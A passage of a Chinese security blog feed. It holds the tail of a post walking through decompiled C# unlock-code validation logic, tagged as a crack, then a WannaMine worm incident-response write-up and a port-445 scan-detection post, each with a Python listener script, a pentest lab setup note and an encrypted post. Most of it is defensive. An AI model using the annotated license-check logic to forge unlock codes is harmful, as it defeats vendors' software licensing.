class="comment">//如果输入的第一个字符不为F，返回假</span></span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> num = <span class="built_in">int</span>.Parse(string_0[<span class="number">2</span>].ToString(), NumberStyles.HexNumber);</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a != <span class="string">&quot;I:ALV&quot;</span>)<span class="comment">//如果5~9的字符不为I:ALV 返回假</span></span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">num = <span class="built_in">int</span>.Parse(string_0[<span class="number">3</span>].ToString(), NumberStyles.HexNumber);</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">int</span>.TryParse(string_0.Substring(<span class="number">10</span>, <span class="number">3</span>), <span class="keyword">out</span> num))</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (string_0.Length &lt;= <span class="number">14</span>) <span class="comment">//长度小于14 返回假</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">&quot;Invalid Unlock Code&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> num2 = <span class="built_in">int</span>.Parse(string_0.Substring(<span class="number">15</span>, <span class="number">1</span>));</span><br><span class="line"><span class="keyword">if</span> (num2 != <span class="number">2</span> &amp;&amp; num2 != <span class="number">3</span>) <span class="comment">//第16位不等于2或3，返回假</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">&quot;Incorrect Code for Version&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> s = string_0.Substring(<span class="number">0</span>, <span class="number">16</span>); <span class="comment">//从第1位开始取16位</span></span><br><span class="line"><span class="built_in">string</span> b = string_0.Substring(<span class="number">16</span>);<span class="comment">//17位开始取后面的</span></span><br><span class="line"><span class="built_in">int</span> num3 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">byte</span>[] bytes = Encoding.ASCII.GetBytes(s);</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; bytes.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (bytes[i] % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">num3++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> !(num3.ToString(<span class="string">&quot;00&quot;</span>) != b) &amp;&amp; flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具ji </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crack </tag>
            
            <tag> 应急响应 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WannaMine蠕虫清理</title>
      <link href="/p/4319.html"/>
      <url>/p/4319.html</url>
      
        <content type="html"><![CDATA[<p>今天接到了内网的检测服务器告警，检测到我的主机对外扫描445端口</p><span id="more"></span><p>本次监测使用了2台基于VMware ESXi架构的虚拟服务器，IP及系统架构如下</p><ul><li>10.16.11.51 CentOS7【监测机】</li><li>10.16.11.15 Windows Server 2008 R2【诱捕机】<h1 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h1>脚本使用Python3编写，运行于CentOS7虚拟机（10.16.11.51）上，由于感染后的机器特征为向外部扫描445端口，如下图所示</li></ul><p><img src="/images/Snipaste_2019-06-02_18-08-48.png" alt="被感染主机的网络连接"></p><p>脚本编写思路为监听445端口，如有连接即写入文件并记录连接IP<br>代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务器</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># 处理客户端请求</span></span><br><span class="line"><span class="comment"># 监听任意地址</span></span><br><span class="line">IP_ADDRESS = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"><span class="comment"># 记录的文件名</span></span><br><span class="line">FILENAME = <span class="string">&#x27;log.txt&#x27;</span></span><br><span class="line"><span class="comment"># 监听端口</span></span><br><span class="line">PORT = <span class="number">445</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printalert</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31m &#x27;</span> + string + <span class="string">&#x27; \033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printsuccess</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;32m &#x27;</span> + string + <span class="string">&#x27; \033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printwarning</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;33m &#x27;</span> + string + <span class="string">&#x27; \033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printinfo</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[0;34m &#x27;</span> + string + <span class="string">&#x27; \033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">tcp_server</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.tcp_socket.bind((IP_ADDRESS, PORT))</span><br><span class="line">        self.tcp_socket.listen(<span class="number">250</span>)</span><br><span class="line">        self.proceses = []</span><br><span class="line">        printsuccess(<span class="string">&#x27;Server Start Success,Waiting For Connect....\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_server</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            sock, addr = self.tcp_socket.accept()</span><br><span class="line">            <span class="comment"># 创建新线程来处理每个客户端连接</span></span><br><span class="line">            t = threading.Thread(target=self.tcp_server, args=(sock, addr))</span><br><span class="line">            t.start()</span><br><span class="line">            t.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tcp_server</span>(<span class="params">self, sock, addr</span>):</span><br><span class="line">        <span class="comment"># 事件产生时间</span></span><br><span class="line">        TIME = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime())</span><br><span class="line">        printinfo(<span class="string">&#x27;[i] Accept new connection from %s:%s&#x27;</span> % addr + <span class="string">&#x27; ...at [&#x27;</span> + <span class="built_in">str</span>(TIME) + <span class="string">&#x27;]\n&#x27;</span>)</span><br><span class="line">        printinfo(<span class="string">&#x27;当前线程：&#x27;</span> + threading.current_thread().name + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        self.writelog(addr)</span><br><span class="line">        sock.close()</span><br><span class="line">        printinfo(<span class="string">&#x27;[-] Connection from %s:%s closed \n&#x27;</span> % addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写日志</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writelog</span>(<span class="params">self, addr</span>):</span><br><span class="line">        <span class="comment"># 事件产生时间</span></span><br><span class="line">        TIME = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime())</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(FILENAME, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            line = file.read().splitlines()</span><br><span class="line">            <span class="keyword">if</span> addr[<span class="number">0</span>] <span class="keyword">in</span> line:</span><br><span class="line">                printwarning(<span class="string">&#x27;[!] Detect &#x27;</span> + <span class="built_in">str</span>(addr[<span class="number">0</span>]) + <span class="string">&#x27; Connect &#x27;</span> + <span class="built_in">str</span>(PORT) + <span class="string">&#x27; Port At [&#x27;</span> + <span class="built_in">str</span>(TIME) + <span class="string">&#x27;] And This IP Has Been Recorded!\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(FILENAME, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> file1:</span><br><span class="line">                    file1.write(<span class="built_in">str</span>(addr[<span class="number">0</span>]) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                    printalert(<span class="string">&#x27;[+] Detect &#x27;</span> + <span class="built_in">str</span>(addr[<span class="number">0</span>]) + <span class="string">&#x27; Connect  &#x27;</span> + <span class="built_in">str</span>(PORT) + <span class="string">&#x27; Port At [&#x27;</span> + <span class="built_in">str</span>(TIME) + <span class="string">&#x27;] .\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = tcp_server()</span><br><span class="line">    s.run_server()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>运行后如图所示</p><p><img src="/images/1559578344395.png" alt="1559578344395"></p><p>当有连接发生时输出相关内容（连接IP、端口、事件产生时间），并记录到脚本运行目录下的<code>log.txt</code>中</p><p><img src="/images/1559578408835.png" alt="1559578408835"></p><p><img src="/images/1559578423971.png" alt="1559578423971"></p><h1 id="诱捕"><a href="#诱捕" class="headerlink" title="诱捕"></a>诱捕</h1><p>10.16.11.15主机关闭防火墙，等待一段时间后被成功植入病毒</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>被成功攻陷后被植入相关工具（NSA武器库），武器库的路径位于<code>C:\Windows\NetworkDistribution</code></p><p><img src="/images/1.png" alt="1"></p><p>同时系统进程中出现了一个使用<code>cmd</code>启动的非<code>system32目录</code>下的<code>svchost程序</code></p><p><img src="/images/2.png" alt="2"></p><p>系统服务中被随机创建了一个服务，本次诱捕机中的服务为<code>ApplicationProtocolHost</code></p><p><img src="/images/3.png" alt="3"></p><p>并在<code>C:\Windows\System32</code>下释放与服务名称一致的<code>dll</code>文件，用于被系统正常的<code>svchost</code>启动</p><p><img src="/images/4.png" alt="4"></p><p>由于病毒的服务名称会从以下字符串中拼凑，所以服务名并不为鉴别病毒的可靠方式</p><p><img src="/images/5.png" alt="5"></p><p>主服务的命名规则为<code>“字符串1+字符串2+字符串3”</code>,如上面提及的<code>ApplicationProtocolHost</code>，即<code>Application+Protocol+Host</code>。</p><table><thead><tr><th>字符串1列表</th><th>字符串2列表</th><th>字符串3列表</th></tr></thead><tbody><tr><td>Windows</td><td>Update</td><td>Service</td></tr><tr><td>Microsoft</td><td>Time</td><td>Host</td></tr><tr><td>Network</td><td>NetBIOS</td><td>Client</td></tr><tr><td>Remote</td><td>RPC</td><td>Event</td></tr><tr><td>Function</td><td>Protocol</td><td>Manager</td></tr><tr><td>Secure</td><td>SSDP</td><td>Helper</td></tr><tr><td>Application</td><td>UPnP</td><td>System</td></tr></tbody></table><p>但是由于系统为中文操作系统，因此可以通过该服务的描述进行甄别</p><p><img src="/images/6.png" alt="6"></p><p><code>WannaMine 4.0</code>挖矿主体病毒文件为<code>dllhostex.exe</code>（<code>C:\Windows\System32\dllhostex.exe</code>），负责挖取门罗币。</p><p><img src="/images/7.png" alt="7"></p><h1 id="清理方式"><a href="#清理方式" class="headerlink" title="清理方式"></a>清理方式</h1><ol><li>禁用随机拼凑命名的服务。</li><li>使用<code>XueTr</code>（<code>PChunter</code>）卸载异常的<code>svchost</code>（<code>非system32目录下的svchost程序</code>）的挂载的模块（<code>即上文提到的随机拼凑命名的.dll</code>）<code>并删除</code>。</li><li>结束异常进程</li><li>删除随机拼凑命名的服务。</li><li>删除<code>C:\Windows\System32\dllhostex.exe</code>、<code>C:\Windows\NetworkDistribution\</code></li><li><strong>安装MS17-010补丁</strong></li></ol>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
            <tag> Windows Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>被动式检测445端口扫描</title>
      <link href="/p/f3b3.html"/>
      <url>/p/f3b3.html</url>
      
        <content type="html"><![CDATA[<p>为了检测内网的端口扫描写了个脚本。。。</p><span id="more"></span><h1 id="事情起源"><a href="#事情起源" class="headerlink" title="事情起源"></a>事情起源</h1><p>之前一直在做域控搭建，结果域控机（DC）老是莫名其妙重启，排查事件管理器后发现了点东西</p><p><img src="/images/1559234162802.png" alt="1559234162802"></p><p>一堆的电源报警事件（该事件只会在系统非正常关机、重启时出现），后面进<code>ESXi</code>管理面板准备重装时发现蓝屏了，报错显示<code>srv.sys</code>驱动出现问题，经过查询后发现系统有<code>MS17-010</code>漏洞（<code>wannacry</code>干的，能把2016打蓝屏也是没谁了）</p><h1 id="处理过程"><a href="#处理过程" class="headerlink" title="处理过程"></a>处理过程</h1><p>打补丁，用脚本检测内网的扫描情况，汇报上面让他们处理去吧。。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: Sp4ce</span></span><br><span class="line"><span class="string">@Github: https://github.com/NS-Sp4ce</span></span><br><span class="line"><span class="string">@Date: 2019-05-29 23:18:36</span></span><br><span class="line"><span class="string">@LastEditors: Sp4ce</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-05-29 23:18:36</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 服务器</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 处理客户端请求</span></span><br><span class="line"><span class="comment"># 监听任意地址</span></span><br><span class="line">IP_ADDRESS = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"><span class="comment"># 记录的文件名</span></span><br><span class="line">FILENAME = <span class="string">&#x27;log.txt&#x27;</span></span><br><span class="line"><span class="comment"># 监听端口</span></span><br><span class="line">PORT = <span class="number">445</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printalert</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31m &#x27;</span> + string + <span class="string">&#x27; \033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printsuccess</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;32m &#x27;</span> + string + <span class="string">&#x27; \033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printwarning</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;33m &#x27;</span> + string + <span class="string">&#x27; \033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printinfo</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[0;34m &#x27;</span> + string + <span class="string">&#x27; \033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">tcp_server</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.tcp_socket.bind((IP_ADDRESS, PORT))</span><br><span class="line">        self.tcp_socket.listen(<span class="number">250</span>)</span><br><span class="line">        self.proceses = []</span><br><span class="line">        printsuccess(<span class="string">&#x27;Server Start Success,Waiting For Connect....\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run_server</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            sock, addr = self.tcp_socket.accept()</span><br><span class="line">            <span class="comment"># 创建新线程来处理每个客户端连接</span></span><br><span class="line">            t = threading.Thread(target=self.tcp_server, args=(sock, addr))</span><br><span class="line">            t.start()</span><br><span class="line">            t.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tcp_server</span>(<span class="params">self, sock, addr</span>):</span><br><span class="line">        <span class="comment"># 事件产生时间</span></span><br><span class="line">        TIME = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime())</span><br><span class="line">        printinfo(<span class="string">&#x27;[i] Accept new connection from %s:%s&#x27;</span> % addr + <span class="string">&#x27; ...at [&#x27;</span> + <span class="built_in">str</span>(TIME) + <span class="string">&#x27;]\n&#x27;</span>)</span><br><span class="line">        printinfo(<span class="string">&#x27;当前线程：&#x27;</span> + threading.current_thread().name + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        self.writelog(addr)</span><br><span class="line">        sock.close()</span><br><span class="line">        printinfo(<span class="string">&#x27;[-] Connection from %s:%s closed \n&#x27;</span> % addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 写日志</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">writelog</span>(<span class="params">self, addr</span>):</span><br><span class="line">        <span class="comment"># 事件产生时间</span></span><br><span class="line">        TIME = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, time.localtime())</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(FILENAME, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            line = file.read().splitlines()</span><br><span class="line">            <span class="keyword">if</span> addr[<span class="number">0</span>] <span class="keyword">in</span> line:</span><br><span class="line">                printwarning(<span class="string">&#x27;[!] Detect &#x27;</span> + <span class="built_in">str</span>(addr[<span class="number">0</span>]) + <span class="string">&#x27; Connect &#x27;</span> + <span class="built_in">str</span>(PORT) + <span class="string">&#x27; Port At [&#x27;</span> + <span class="built_in">str</span>(TIME) + <span class="string">&#x27;] And This IP Has Been Recorded!\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(FILENAME, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> file1:</span><br><span class="line">                    file1.write(<span class="built_in">str</span>(addr[<span class="number">0</span>]) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                    printalert(<span class="string">&#x27;[+] Detect &#x27;</span> + <span class="built_in">str</span>(addr[<span class="number">0</span>]) + <span class="string">&#x27; Connect  &#x27;</span> + <span class="built_in">str</span>(PORT) + <span class="string">&#x27; Port At [&#x27;</span> + <span class="built_in">str</span>(TIME) + <span class="string">&#x27;] .\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = tcp_server()</span><br><span class="line">    s.run_server()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(FILENAME):</span><br><span class="line">        printwarning(<span class="string">&#x27;[!] Log file is not exists, will create it.\n&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">r&quot;touch &#123;&#125;&quot;</span>.<span class="built_in">format</span>(FILENAME))</span><br><span class="line">        printsuccess(<span class="string">&#x27;[+] Create log file success !\n&#x27;</span>)</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>脚本是<code>Python3</code>写的，运行截图如下</p><p><img src="/images/1559235245969.png" alt="运行截图"></p><p>脚本运行后会在当前目录生成<code>log.txt</code>，记录抓到的IP</p><p><img src="/images/1559235264036.png" alt="log文件"></p><p>然后挂在后台跑就行了，可以用<code>screen</code>开后台任务</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透—环境部署</title>
      <link href="/p/e2be.html"/>
      <url>/p/e2be.html</url>
      
        <content type="html"><![CDATA[<p>记录下部署靶机环境</p><span id="more"></span><h1 id="部署靶机环境"><a href="#部署靶机环境" class="headerlink" title="部署靶机环境"></a>部署靶机环境</h1><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p>首先打开靶机的防火墙规则</p><p><img src="/images/1558454560663.png" alt="1558454560663"></p><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><p>环境部署如下图</p><p><img src="/images/20190527002709055.png"></p><h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><h3 id="10-16-11-15"><a href="#10-16-11-15" class="headerlink" title="10.16.11.15"></a>10.16.11.15</h3><p>本台主机配置如下</p><blockquote><p>OS:Windows Server 2008 R2</p><p>App:phpstudy</p><p>CMS: DeDeCMS 20180109</p></blockquote><p><img src="/images/1558888289570.png" alt="1558888289570"></p><h3 id="10-16-11-16"><a href="#10-16-11-16" class="headerlink" title="10.16.11.16"></a>10.16.11.16</h3><p>本台主机配置如下</p><blockquote><p>OS:Windows Server 2012 R2</p><p>App: phpstudy</p><p>CMS: DeDeCMS 20180109</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>360企业安全面试总结</title>
      <link href="/p/cc69.html"/>
      <url>/p/cc69.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="d5a334dcec0ea7a39c43e1e6b6e1627630d6f872d187efcceafc196800254550">936a20ef2b6474e2af9b2dc796249dea60fd9b2d4d21a5943810538e97eb3c9c7796b8d45df5ca4542c935df15cb3ba2750e998b3b454beb75242c18772949626a1fb45d6fc7495becd497d869e993c0fa5fec900e17c0eebdf4a84172ec695effe39da643b6a4b83732de1273c5af91a7aa73d2abf985444598da85f0314d64fcd890011ae8e66a007eaba99455359ad3ac9a7b1dd3cc5476ecccf3bebe92530e0af7837102dfe0fca8981156c620ab2e1a9add106ae97ca064ac9e5fcb0bb80297af7971739e1f3b646c05d0882802e7ba815aee5a52d48582db14d38c05cad2d7d43f1b6354354f7993853f390dd66290e99631c1d4ce8aef88a125f4fd4651ff98a86123bc1704a7bb2f1b83242263aef12547e90b5313274e9d2c1d29c9745dd854d09eb54bbe5d2cebee3bd137de6002b5276e12a257249773059fc62b2da306ed7e1a4835c63b165c74e2d431b014ec1d34602e944c1f68148c431fc1b247181e09d7b1cae43ca796ada2d937007c9ebf8df9d6632fb93ae342998e24472a6685dab11d55390c4edfaa0f76a9856ce4b9445acab0517e45f65357ece8fd7286a2330c874144189b645432b89ccfbd08f2f55b5bf8bf24e5e4b165a9951c4182d7b9ea90afd2b20a802bbfd3aa97e05708b18c6c98e91c4728a375461a1aebbf546a71d87c3607207559b10caa676d43336a044377a35f67b523134febb191786d6348eede76cc0409eebc6cdeb280b5050d03ac0919f169bd0e22dbeed8f7c5c7d6f1a7c059ba3560dca9b6daf85923db352246b0f7f48aaf87f36a132690c0a3d82632cd9b947022501d2409f350f18c61f942571026870595d0122d1fb9ca79c446160c05b4b390549e4358f69e98d51fd5114b7977d0a2b9de695ad007a24950c15ad4fba5335f7fb8c43362c7b071ee9d5dfee84a5f6ad9f0f1355c0ab421222e699366a6340c3b0a798f14068e4c74184b8acd8ee5a9dd234d0467036cc7e6e677bb4b684946b8167b492a6a817bb49a5adfa5fcd1388dbac718245969c75632f666485d2015e844386306d86e067f1b292af363de316d5e60484ff3ff7cb4a8bf45549c3967dd3452d88332e8717f9aa7c12f54ec305daf069b7de68fe55aa31459a0f504bd95e5cbdc2f16812dcee933a55e92866eda2e1756fd8683d641230eb53e898a950a137f3cb99fa9473a8ed3ecd19fad255dc3bc7c906b54782f266bead93c9e73026a5ccb32b212cf182737687b2554bd379a35ef94a272cf5945359210c953a815b2ef3e106fa5e6381045f68816fff39d93b7dc4321c88abd9c7d63f5af6c9ef4f2badb3983e579bcbf4c18e75911b13010e6de6f11eaa7a5fb061733439a5dd390e57bf9ec7254b2726454aac02119263e0e936fe2b59b88e05c89e87a75193eeade8b3ee0ebd9999d17389ebc4810e640d73d2396cf89f7c1402525d8d4533107f74b0b9f0afe60d5c30d70730eaab76fa2066246c5a7a3a2d7e3a76569295cd0efce69dbb2cdddbeaf884487ab2a1cc05be1601efc8d32eb4dfe8dd13f8558dadfa5c9412f2bca3b47d5373ec90450d4524013d1c1eaead618037385a070e20edd2c1e979725afaa1514ada2846ad7808369b33ab37e117793aa88e5021f9fa55fee7f63d664da40b98d0a07b28f4799e487c4533f53986326d842ff90631b7e42d5f7f664b6c1dc3a3133215c7b0bfdb716fd77615b4e7698165db0db70e49e74df3631b70eb4b9bc01e177f01b09cc6ede89d7525d0fcb5c62e48ea854f9736f35de3efd3c1f151d6b34a37b0a36e86da3fff54b3c0828eb6cd99f7a360ca7f5f09deea9171f5f7801606aa237c5b469ce52e474183b30ddb04096ab2f34d56c2a4e510869250d210864231718effd24455aaf37bf3370cfcf3d9f163b385e9bf1e487ea5d27ec49f20ea8c68eb1fbed5bae45b43dc2e8629e5f9ae7ca39a80fbc3117d9a7c53d6a041c8cf8476b0e028d302bcdf9e4a9208a079b12a22f587df0ca17eca0594bd44dd3e764591e9c4a0aa089389b0ab9a13ce4ae4795f25778e322a3b9276074503c444d58f29aee2af9195f40af852b3ac375eeec318d5d0927ff12b60b6f6fabc9b08259e39aefe5d2362e85e9c11df9de011dc8203afecd09de3257594e57b6b0bcdc7fc355d9519477b5364115d235be23144e1fc7b432fcd83ce63a0343aa747ac6af71ec9dbc0e36f6433b8bae09decc03d5bc72cd2a8cca7d1aea6ea0f5fd47daeb184b5bcf7dfbd27a3776d8dd08c8f856fee7c306c5e329db75c1b31ec2992de250b27e733ac668fe0b80587a9d78fa885263752422819ceea45d1c528eabd60ded34356151154d8c903b879e4f96f49740f2ee9402b05555068608b62fb41f4520c15074632e98ccce0878ba24b1e7f7766fe9e017d718c92803806ab285cb01b9949d3dee38dcd80d3fb8280fa3de89d64c1af329b772441fab4f883f1215abf559496d2626b9fb6cec257bda57751c44c83958ec22892eca8818ae06ae3439dcfdaf4c47612fa7b6940332e13270be809bcb435c8285e57ba30fad88d1a17e7bb9d8d39ad715d867501a608070583f2cc507e24109787bbcc22e7c6ec82a586fc8309eb53a54b2ab83149dbbbd88df0362c7d1dacf9757ec3c582da68c57746172e5d699ab38b028000b05855eea0bc6ad9167eb85d4dcaaba5f153ab56502097d4fbb5a5ff209e2e51af4c723c4d41cdff32618fdc494b34d38b0bebc844b756f9da6347e7cb2391e1ae665dd37b75fea933312f5ee9db4bb015baccef53bf65e66e5ff6b5b9fb018a6d45a2b4c8288feeeada1f0d225f807d6db6f64d811b63d87a6ba8302d8249d6c973b17317c4db89b6153f92e552861ed94c3d88bce463916b6f35f4416f44adafbab0a9ecbbef687b3dc80e328b4a19fb1715466e2ed5d6524784001f07c700cf5b729b2f28b5f804f8025fd446e00c6bf14c6dc6737fd5cc51493bbb93620af723b50a949f37cabc76f9f7f50ded77e1a308f329f652e2350466bbfd25519b3fa3cd47290f11ffeba9ac519cab172b294a8604630d235fced06b556cd71f6196f5ca20dce5ca3b2fb5435caa7e69876013b947c48a4be2c5c14c1ce1945ee643bad695fb8bd91329467168ae38f5b2939d00021b9f4d6f926b513e8676663a0f1755fe89df5231d670335495885843f2f74ef6f3803af670c28d31ce50f2bca397c1d85eeb62c825e1082f0559180134aa114adaffff1b1b6f7ad8c74248b188940ce322e43b5db26d6f492739fcafbd74d39bed9adf9e2aaaa52e241cff449d495061d841892bd71160e061c8baa7de53563e13310ee69405d7e1c170fa68d7d0c5ec7b07ede4e99dd6f916e2782f33ab3eb8d31033387bfa3aab2bb9c50f5d21c59aa9d2cfb6a65bfc4f805871a620442cb77a05a35ceb15cff7b191b6223adbfe44e18ec2a653914ff110dd49d383b3fe8f5c89b366b9cb48fdccecb7d0c84b1f82ec9a2efa428678d7353371e5893deb7329137bd37c421be0ff9925a61e9721d15252180ca2afd